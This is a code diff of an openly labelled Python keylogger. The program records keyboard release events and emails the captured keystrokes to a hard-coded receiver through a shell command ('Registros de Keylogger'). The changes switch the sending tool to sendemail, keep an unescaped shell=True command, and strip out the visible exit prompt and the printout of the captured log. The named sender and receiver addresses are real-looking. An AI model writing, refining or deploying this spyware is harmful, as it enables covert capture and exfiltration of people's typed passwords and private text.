@@ -11,11 +11,9 @@ def output(text):
         f.write(text)
 
 def send_email(sender_email, receiver_email, mensaje):
-    command = f"echo '{mensaje}' | mail -s 'Registros de Keylogger' -r {sender_email} {receiver_email}"
-    subprocess.run(command, shell=True)
+    command = f"sendemail -f {sender_email} -t {receiver_email} -u 'Registros de Keylogger' -m '{mensaje}'"
 
-def install_postfix():
-    subprocess.run(["apt", "install", "postfix", "-y"])
+    subprocess.run(command, shell=True)
 
 def start_postfix():
     subprocess.run(["systemctl", "start", "postfix"])
@@ -36,23 +34,15 @@ def main():
         return
     
     keyboard.on_release(callback)
-    
-    while True:
-        if input() == 'exit':
-            print("Terminando la ejecución del programa...")
-            break
             
     keyboard.unhook_all()
     
     registro = "\n".join(registros)
-    
-    print(registro)
-    
+      
     if respuesta_email.lower() in ['yes', 'y']:
         sender_email = "janet1204@ciencias.unam.mx"
         receiver_email = "Paola_VB@ciencias.unam.mx"
-        
-        install_postfix()
+    
         start_postfix()
         
         send_email(sender_email, receiver_email, registro)
